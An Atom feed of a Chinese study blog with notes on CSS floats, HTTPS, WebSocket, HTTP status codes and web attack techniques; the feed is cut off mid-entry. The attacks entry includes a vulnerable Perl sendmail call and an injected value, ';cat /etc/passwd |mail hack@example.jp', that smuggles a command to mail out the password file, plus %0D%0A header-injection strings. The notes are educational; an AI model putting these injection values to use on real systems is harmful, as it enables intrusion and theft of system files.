<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小柒</title>
  
  <subtitle>www.xiaoqi.cn</subtitle>
  <link href="https://coloey.github.io/atom.xml" rel="self"/>
  
  <link href="https://coloey.github.io/"/>
  <updated>2022-04-13T01:47:12.219Z</updated>
  <id>https://coloey.github.io/</id>
  
  <author>
    <name>小柒</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>清除浮动</title>
    <link href="https://coloey.github.io/2022/04/13/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/"/>
    <id>https://coloey.github.io/2022/04/13/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/</id>
    <published>2022-04-13T01:36:28.000Z</published>
    <updated>2022-04-13T01:47:12.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为什么需要清除浮动"><a href="#为什么需要清除浮动" class="headerlink" title="为什么需要清除浮动"></a>为什么需要清除浮动</h1><p>由于父级盒子很多情况下，不方便给高度，当时盒子浮动又不占有位置，最后父级盒子高度为 0 时，就会影响下面的盒子，对后面元素排版产生影响。</p><h1 id="清除浮动本质"><a href="#清除浮动本质" class="headerlink" title="清除浮动本质"></a>清除浮动本质</h1><ul><li>清除浮动的本质是清除浮动元素造成的影响</li><li>如果父盒子本身具有高度，则不需要清除浮动</li><li>清除浮动之后，父级会根据浮动的子盒子自动检测高度，父级有了高度，就不会影响下面的标准流了</li></ul><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">选择器: &#123;</span><br><span class="line">  clear: 属性值;</span><br><span class="line">&#125;Copy <span class="selector-tag">to</span> clipboardErrorCopied</span><br></pre></td></tr></table></figure><table><thead><tr><th>属性值</th><th>描述</th></tr></thead><tbody><tr><td>left</td><td>不允许左侧有浮动元素</td></tr><tr><td>right</td><td>不允许右侧有浮动元素</td></tr><tr><td>both</td><td>同时清除左右两侧浮动</td></tr></tbody></table><p>清除浮动策略：闭合浮动</p><p>方法：</p><ol><li><strong>额外标签法（隔墙法）</strong>，是 W3C 推荐的方法</li><li>父级添加 overflow 属性</li><li>父级添加 after 伪元素</li><li>父级添加双伪元素</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;为什么需要清除浮动&quot;&gt;&lt;a href=&quot;#为什么需要清除浮动&quot; class=&quot;headerlink&quot; title=&quot;为什么需要清除浮动&quot;&gt;&lt;/a&gt;为什么需要清除浮动&lt;/h1&gt;&lt;p&gt;由于父级盒子很多情况下，不方便给高度，当时盒子浮动又不占有位置，最后父级盒子高度为 </summary>
      
    
    
    
    <category term="CSS" scheme="https://coloey.github.io/categories/CSS/"/>
    
    
  </entry>
  
  <entry>
    <title>HTTPS</title>
    <link href="https://coloey.github.io/2022/04/12/HTTPS/"/>
    <id>https://coloey.github.io/2022/04/12/HTTPS/</id>
    <published>2022-04-12T14:02:46.000Z</published>
    <updated>2022-04-13T02:10:02.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+加密+认证+完整性保护=HTTPS"></a>HTTP+加密+认证+完整性保护=HTTPS</h1><p>HTTPS是HTTP通信接口部分用SSL和TLS协议代替。</p><p><img src="/2022/04/12/HTTPS/image-20220412220554428-16498156890354.png" alt="image-20220412220554428-16498156890354"></p><p>SSL是独立于HTTP的协议</p><h1 id="相互交换密钥的公开密钥加密技术"><a href="#相互交换密钥的公开密钥加密技术" class="headerlink" title="相互交换密钥的公开密钥加密技术"></a>相互交换密钥的公开密钥加密技术</h1><h2 id="共享密钥加密"><a href="#共享密钥加密" class="headerlink" title="共享密钥加密"></a>共享密钥加密</h2><p>加密和解密用一个密钥的方式，也叫做对称密钥加密</p><p><img src="/2022/04/12/HTTPS/image-20220412220843669-16497725444302.png" alt="image-20220412220843669-16497725444302"></p><h2 id="使用两把密钥的公开密钥加密"><a href="#使用两把密钥的公开密钥加密" class="headerlink" title="使用两把密钥的公开密钥加密"></a>使用两把密钥的公开密钥加密</h2><p>使用非对称的密钥，一把叫做私有密钥，另一把叫做公有密钥，私有密钥不能让任何人知道，公有密钥可以随意发布。</p><p>发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密，解密过程是队离散对数的求值。</p><h2 id="HTTPS采用混合加密机制"><a href="#HTTPS采用混合加密机制" class="headerlink" title="HTTPS采用混合加密机制"></a>HTTPS采用混合加密机制</h2><p><img src="/2022/04/12/HTTPS/image-20220412221342675-16497728370873.png" alt="image-20220412221342675-16497728370873"></p><h2 id="证明公开密钥正确性的证书"><a href="#证明公开密钥正确性的证书" class="headerlink" title="证明公开密钥正确性的证书"></a>证明公开密钥正确性的证书</h2><p><img src="/2022/04/12/HTTPS/image-20220412221707589-16497730392834.png" alt="image-20220412221707589-16497730392834"></p><h1 id="HTTPS的安全通信机制"><a href="#HTTPS的安全通信机制" class="headerlink" title="HTTPS的安全通信机制"></a>HTTPS的安全通信机制</h1><p><img src="/2022/04/12/HTTPS/image-20220412221846408-16497731373315.png" alt="image-20220412221846408-16497731373315"></p><ol><li>客户端通过发送Client Hello报文开始SSL通信，报文中包含客户端支持的SSL的指定版本，加密组件列表</li><li>服务器可进行SSL通信时，会以Server Hello报文作为应答，和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的</li><li>之后服务器发送Certificate报文，报文中包含公开密钥证书</li><li>最后服务器发送Server Hello Done 报告通知客户端，最初阶段的SSL握手协商部分结束</li><li>SSL第一次握手结束后，客户端以Client Key Exchange报文作为回应，报文中包含通信加密中使用的一种被称为Pre-master secret的随机密码串，该报文已用步骤3中的公开密钥进行加密</li><li>接着客户端继续发送Change Cipher Spec报文，该报文会提示服务器，在此报文之后的通信会采用Pre-master secret密钥加密</li><li>客户端发送Finished报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否正确解密该报文作为判定标准</li><li>服务器同样发送Change Cipher Spec报文</li><li>服务器同样发送Finished报文</li><li>服务端和客户端的Finished报文交换完毕后，SSL连接就建立完成。通信会受到SSL保护，从此开始进行应用层协议通信，即发送HTTP请求</li></ol><p><img src="/2022/04/12/HTTPS/image-20220412222929047-16497737799696.png" alt="image-20220412222929047-16497737799696"></p><h2 id="SSL缺点："><a href="#SSL缺点：" class="headerlink" title="SSL缺点："></a>SSL缺点：</h2><ul><li>通信慢</li><li>大量消耗CPU及内存资源，导致处理速度慢</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTTP-加密-认证-完整性保护-HTTPS&quot;&gt;&lt;a href=&quot;#HTTP-加密-认证-完整性保护-HTTPS&quot; class=&quot;headerlink&quot; title=&quot;HTTP+加密+认证+完整性保护=HTTPS&quot;&gt;&lt;/a&gt;HTTP+加密+认证+完整性保护=HTT</summary>
      
    
    
    
    <category term="http" scheme="https://coloey.github.io/categories/http/"/>
    
    
  </entry>
  
  <entry>
    <title>针对Web的攻击技术</title>
    <link href="https://coloey.github.io/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/"/>
    <id>https://coloey.github.io/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/</id>
    <published>2022-04-12T10:09:24.000Z</published>
    <updated>2022-04-12T14:00:45.873Z</updated>
    
    <content type="html"><![CDATA[<h1 id="针对Web应用的攻击模式"><a href="#针对Web应用的攻击模式" class="headerlink" title="针对Web应用的攻击模式"></a>针对Web应用的攻击模式</h1><ul><li>主动攻击</li><li>被动攻击</li></ul><h2 id="以服务器为目标的主动攻击"><a href="#以服务器为目标的主动攻击" class="headerlink" title="以服务器为目标的主动攻击"></a>以服务器为目标的主动攻击</h2><p>指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式，由于该模式是直接针对服务器的资源进行攻击的，因此攻击者需要能访问到那些资源，主动攻击模式里具有代表性的攻击时SQL注入攻击和OS命令注入攻击</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412181613054-16497586163871.png"></p><h2 id="以服务器为目标的被动攻击"><a href="#以服务器为目标的被动攻击" class="headerlink" title="以服务器为目标的被动攻击"></a>以服务器为目标的被动攻击</h2><p>被动攻击利用圈套策略执行攻击代码的攻击模式。攻击者不直接对目标Web应用访问攻击</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412182127382-16497589309272.png" alt="image-20220412182127382"></p><h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><p>是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击，动态创建的HTML部分可能隐藏着安全漏洞，就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，就会受到被动攻击</p><h3 id="跨站脚本攻击可能造成的影响"><a href="#跨站脚本攻击可能造成的影响" class="headerlink" title="跨站脚本攻击可能造成的影响"></a>跨站脚本攻击可能造成的影响</h3><ul><li>利用虚假输入的表单骗取用户个人信息</li><li>利用脚本窃取用户的COOkie值，被害者在不知情的情况下帮助攻击者发送请求</li><li>显示伪造的文章或图片</li></ul><p>eg:</p><p>在网站地址朗中URI测查询字段ID即相当于在表单内自动填写字符串的功能，写入：</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412183440243-16497596969543.png" alt="image-20220412183440243"></p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412183528509-16497597414094.png" alt="image-20220412183528509"></p><h3 id="对用户Cookie的窃取"><a href="#对用户Cookie的窃取" class="headerlink" title="对用户Cookie的窃取"></a>对用户Cookie的窃取</h3><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412183650899-16497598258515.png" alt="image-20220412183650899"></p><h2 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h2><p>会执行非法SQL的SQL注入攻击</p><h3 id="造成影响："><a href="#造成影响：" class="headerlink" title="造成影响："></a>造成影响：</h3><ul><li>非法查看或篡改数据库内的数据</li><li>规避认证</li><li>执行和数据库服务业务关联的程序等</li></ul><p>eg:</p><p>某购物网站可将坐着名字作为搜索关键字查找他的所有著作</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412200225045-16497649612096.png" alt="image-20220412200225045"></p><p>结果跟flag=1的设定值无关，只取出author=”上野宣”，这样未出版的书籍也一并显示</p><h2 id="OS命令注入攻击"><a href="#OS命令注入攻击" class="headerlink" title="OS命令注入攻击"></a>OS命令注入攻击</h2><p>指通过Web应用，执行非法的操作系统命令达到攻击的目的，只要在能调用Shell函数的地方就有存在被攻击的风险。</p><p>可以从Web应用中通过Shell来调用操作系统命令，倘若调用Shell时存在疏漏，就可以执行非法的OS命令。OS命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。</p><p>eg:</p><p>咨询表单的发送功能，将用户的咨询邮件按已填写对方的邮箱地址发送过去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr= $q-&gt;param(&#x27;mailaddress&#x27;);</span><br><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail $adr&quot;);</span><br><span class="line">print MAIL &quot;FROM :info@example.com\n&quot;;</span><br></pre></td></tr></table></figure><p>程序中的open函数会调用sendmail命令发送邮件，而制定邮件发送地址是$adr，攻击者把下面的值制定为邮件地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /etc/passwd |mail hack@example.jp</span><br></pre></td></tr></table></figure><p>程序接收到该值后构成以下组合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail;cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure><p>“;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给<a href="mailto:&#104;&#x61;&#x63;&#107;&#x40;&#101;&#120;&#x61;&#109;&#112;&#x6c;&#101;&#x2e;&#x6a;&#x70;">&#104;&#x61;&#x63;&#107;&#x40;&#101;&#120;&#x61;&#109;&#112;&#x6c;&#101;&#x2e;&#x6a;&#x70;</a>。</p><h2 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h2><p>值攻击者通过在响应首部字段内插入换行，添加任意响应首部或主题的一种攻击，属于被动攻击模式。向首部主题内添加内容的攻击称为HTTP响应阶段攻击。</p><p>HTTP首部注入攻击有可能会造成以下影响：</p><ul><li>设置任何Cookie信息</li><li>重定向至任意URL</li><li>显示任意的主体（HTTP响应阶段攻击）</li></ul><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412204121818-16497673045847.png" alt="image-20220412204121818"></p><p>此刻，Set-Cookie生效，攻击者可指定修改任意Cookie信息，通过和绘画固定攻击组合，攻击者可伪装成用户</p><p>攻击者输入%0D%0A变成换行符，结果插入了新的首部字段。</p><h2 id="HTTP响应截断攻击"><a href="#HTTP响应截断攻击" class="headerlink" title="HTTP响应截断攻击"></a>HTTP响应截断攻击</h2><p>HTTP响应截断攻击是用在HTTP首部注入的一种攻击，攻击顺序相同，但是要将两个%0D%0A%0D%0A并排插入字符串后发送，利用这两个连续的换行可作出HTTP首部和主体分割所需的空行，这样就能显示伪造的主体，达到攻击目的。</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412204611730-16497675880148.png" alt="image-20220412204611730"></p><p>利这种攻击，已触发陷阱的用户浏览器会显示伪造的WEB页面，再让用户输入自己的个人信息，达到和XSS攻击相同效果</p><h2 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h2><p>攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。<br>邮件地址：<br>%0D%0A 代表一个换行符，可以实现邮件地址的追加</p><p>%0D%0A%0D%0A代表两个连续的换行符，可以篡改邮件文本内容</p><h2 id="目录遍历攻击："><a href="#目录遍历攻击：" class="headerlink" title="目录遍历攻击："></a>目录遍历攻击：</h2><p>对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击<br>用户可使用．…/等相对路径定位到/etc/passed等绝对路径上<br>例：</p><h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。<br>例：<img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412210605745-16497687833709.png" alt="image-20220412210605745"></p><h2 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a>开放重定向</h2><p>是指对指定的任意URL左重定向跳转功能，而与此功能先关联的安全漏洞是指，加入指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导到那个网站，有可能被攻击者选中并作为钓鱼攻击的跳板</p><h2 id="因会话管理疏忽引发漏洞"><a href="#因会话管理疏忽引发漏洞" class="headerlink" title="因会话管理疏忽引发漏洞"></a>因会话管理疏忽引发漏洞</h2><p>会话劫持：攻击者通过某种手段拿到用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412213958720-164977081222410.png" alt="image-20220412213958720">会话</p><h2 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h2><p>对以窃取目标会话ID为主动攻击手段的会话劫持，会话固定攻击会强制用户使用攻击者指定额会话ID</p><p>例子：</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412214406544-164977106060411.png" alt="image-20220412214406544"></p><h2 id="跨站点请求伪造（CSRF）"><a href="#跨站点请求伪造（CSRF）" class="headerlink" title="跨站点请求伪造（CSRF）"></a>跨站点请求伪造（CSRF）</h2><p>是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p><h3 id="可能造成的影响："><a href="#可能造成的影响：" class="headerlink" title="可能造成的影响："></a>可能造成的影响：</h3><ul><li>利用已通过认证的用户权限更新设定信息等</li><li>利用已通过认证的用户权限购买商品</li><li>利用已通过认证的用户权限在留言板发表言论</li></ul><p>例子：</p><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220412215236611-164977157123012.png" alt="image-20220412215236611"></p><h2 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h2><p>是一种让运行中的服务呈停止状态的攻击，有时也叫停止攻击或拒绝服务攻击，DoS攻击的对象不仅限于Web网站，还包括网络设备及服务器。</p><h3 id="主要有两种DOS攻击方式："><a href="#主要有两种DOS攻击方式：" class="headerlink" title="主要有两种DOS攻击方式："></a>主要有两种DOS攻击方式：</h3><ul><li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈现停止状态。</li><li>通过攻击安全漏洞使服务停止</li></ul><p>集中利用访问请求，就是发送大量的合法请求，服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DOS攻击。</p><p>多台计算机发起的DOS攻击称为DDOS攻击，DDOS攻击通常利用那些感染病毒的极端及作为攻击者的攻击跳板</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;针对Web应用的攻击模式&quot;&gt;&lt;a href=&quot;#针对Web应用的攻击模式&quot; class=&quot;headerlink&quot; title=&quot;针对Web应用的攻击模式&quot;&gt;&lt;/a&gt;针对Web应用的攻击模式&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;主动攻击&lt;/li&gt;
&lt;li&gt;被动攻击&lt;/li&gt;
</summary>
      
    
    
    
    <category term="http" scheme="https://coloey.github.io/categories/http/"/>
    
    
  </entry>
  
  <entry>
    <title>WebSocket</title>
    <link href="https://coloey.github.io/2022/04/12/WebSocket/"/>
    <id>https://coloey.github.io/2022/04/12/WebSocket/</id>
    <published>2022-04-12T09:46:11.000Z</published>
    <updated>2022-04-12T10:03:19.606Z</updated>
    
    <content type="html"><![CDATA[<p>初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？</p><p>答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。</p><p>举例来说，我们想了解今天的天气，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。</p><p>这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用<a href="https://www.pubnub.com/blog/2014-12-01-http-long-polling/">“轮询”</a>：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。</p><p>轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。因此，工程师们一直在思考，有没有更好的方法。WebSocket 就是这样发明的。</p><h2 id="使用浏览器进行全双工通信的WebSocket"><a href="#使用浏览器进行全双工通信的WebSocket" class="headerlink" title="使用浏览器进行全双工通信的WebSocket"></a>使用浏览器进行全双工通信的WebSocket</h2><p>WebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。</p><p>它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于<a href="https://en.wikipedia.org/wiki/Push_technology">服务器推送技术</a>的一种。</p><p>其他特点包括：</p><p>（1）建立在 TCP 协议之上，服务器端的实现比较容易。</p><p>（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。</p><p>（3）减少通信量，只要建立起WebSocket连接，就希望一直保持连接，和http相比，不但每次连接时走开小减少。而且数据格式比较轻量，性能开销小，通信高效。</p><p>（4）可以发送文本，也可以发送二进制数据。</p><p>（5）没有同源限制，客户端可以与任意服务器通信。</p><p>（6）协议标识符是<code>ws</code>（如果加密，则为<code>wss</code>），服务器网址就是 URL。</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws://example.com:80/some/path</span><br></pre></td></tr></table></figure></blockquote><h2 id="握手请求"><a href="#握手请求" class="headerlink" title="握手请求"></a>握手请求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Upgrade:websocket</span><br></pre></td></tr></table></figure><p>Set-WebSocket-Key字段内记录着握手过程中必不可少的键值，Sec-WebSocket-Protocol字段内记录使用的子协议，子协议按WebSocket协议标准在连接分开使用时，定义那些连接的名称</p><h2 id="握手响应"><a href="#握手响应" class="headerlink" title="握手响应"></a>握手响应</h2><p>对于之前的请求，返回状态码101 Switching Protocols的响应</p><p><img src="/2022/04/12/WebSocket/image-20220412180138972-16497577748051.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？&lt;/p&gt;
&lt;p&gt;答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。&lt;/p&gt;
&lt;p&gt;举例来说，我们想了解今天的天气，只能是客户端向服务</summary>
      
    
    
    
    <category term="WebSocket" scheme="https://coloey.github.io/categories/WebSocket/"/>
    
    
  </entry>
  
  <entry>
    <title>返回结果的http状态码</title>
    <link href="https://coloey.github.io/2022/04/11/%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <id>https://coloey.github.io/2022/04/11/%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81/</id>
    <published>2022-04-11T11:58:12.000Z</published>
    <updated>2022-04-11T13:30:34.582Z</updated>
    
    <content type="html"><![CDATA[<h1 id="状态码作用："><a href="#状态码作用：" class="headerlink" title="状态码作用："></a>状态码作用：</h1><p>状态码的职责是当客户端向服务器发送请求时，描述返回的请求结果，借助状态码，用户可以知道服务器时正常处理了请求，还是出现了错误。</p><h1 id="状态码类别："><a href="#状态码类别：" class="headerlink" title="状态码类别："></a>状态码类别：</h1><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1xx</td><td>Informational(信息状态码)</td><td>接收的请求正在处理</td></tr><tr><td>2xx</td><td>Success(成功状态码)</td><td>请求正常处理完毕</td></tr><tr><td>3xx</td><td>Redirection(重定向状态码)</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4xx</td><td>Client Error(客户端错误状态码)</td><td>服务器无法处理请求</td></tr><tr><td>5xx</td><td>Server Error(服务器错误状态码)</td><td>服务器处理请求出错</td></tr></tbody></table><h1 id="2xx成功"><a href="#2xx成功" class="headerlink" title="2xx成功"></a>2xx成功</h1><h2 id="200-OK"><a href="#200-OK" class="headerlink" title="200 OK"></a>200 OK</h2><p>表示从客户端发来的请求在服务器端被正常处理了</p><p>在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用Get方法，对应请求支援的实体会作为响应返回；而使用HEAD方法时，对应请求资源的实体首部不随报文实体作为响应返回。（即在响应中只返回首部，不返回实体主体部分）</p><h2 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h2><p>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，不允许返回任何实体的主体。比如，当从浏览器中发出请求处理后，返回204响应，那么浏览器显示的页面不发生更新。</p><p>一般在只需要从客户端往服务器发送消息，而对客户端不需要发送新消息内容的情况下使用</p><h2 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h2><p>该状态码表示客户端进行范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容</p><h1 id="3xx重定向"><a href="#3xx重定向" class="headerlink" title="3xx重定向"></a>3xx重定向</h1><p>3xx响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p><h2 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h2><p>永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应该使用资源现在所指的URI，也就是说，如果已经把资源对应的URI保存为书签，这时应该按Location首部字段提示的URI重新保存。</p><p>eg:</p><p><a href="http://example.com/sample">http://example.com/sample</a></p><p>当指定资源路径的最后忘记添加“/“，就会产生301状态码</p><h2 id="302-Found"><a href="#302-Found" class="headerlink" title="302 Found"></a>302 Found</h2><p>临时性重定向，该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI访问。和301 Moved Permanently状态码相似，但302状态码代表的资源不是被永久移动，只是临时性质。换句话说，已移动的资源对应的URI将来还有可能发生改变。用户把URI保存成书签，但不会像301状态码出现时那样去更新书签，而是仍旧保留返回的302状态码的页面对应的URI。</p><h2 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h2><p>该状态码表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。303状态码和302Found状态码有着相同功能。但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别。比如，当使用POST方法访问CGI程序，其执行后的处理结果是希望客户端能以GET方法重定向到另一个URI上去时，返回303状态码。</p><p>当301,302,303返回响应码时，几乎所有浏览器都会把POST改为GET，并删除请求报文的主体，之后请求会自动再次发送。</p><p>301,302标准是禁止将POST改为GET，但实际上大家都这么做。</p><h2 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h2><p>该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况，304状态码返回时，不包括任何响应的主体部分。304和重定向没有关系。</p><h2 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h2><p>临时重定向。该状态码与302 Found有着相同的含义。尽管302标准禁止POST变为GET，但实际使用时大家并不遵守。307会按照浏览器标准，不会从POST变成GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同情况。</p><h1 id="4xx客户端错误"><a href="#4xx客户端错误" class="headerlink" title="4xx客户端错误"></a>4xx客户端错误</h1><p>4xx的响应结果表明客户端时发生错误的原因所在</p><h2 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h2><p>该状态码表示请求报文中存在语法错误，当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200 Ok一样对待状态码</p><h2 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h2><p>该状态码表示发送的请求需要有通过HTTP认证（BASIC认证、DIGEST认证）的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。</p><p>返回含有401的响应必须包含一个适用于被请求资源的WWW-Authenticate首部用于质询用户信息，当浏览器初次接收到401响应，会弹出认证用的对话窗口。</p><h2 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h2><p>该状态码表明对请求资源的访问被服务器拒绝了。服务端没有给出拒绝的详细理由，但如果做说明，可以在实体的主体部分对原因进行描述。</p><p>未获得文件系统的访问授权，访问权限出现某些问题（从未授权的源IP地址试图访问）等列举的情况都可能是发生403的原因。</p><h2 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h2><p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务端拒绝请求且不想说理由时使用。</p><h1 id="5xx服务器错误"><a href="#5xx服务器错误" class="headerlink" title="5xx服务器错误"></a>5xx服务器错误</h1><p>5xx的响应结果表明服务器本身发生错误</p><h2 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server 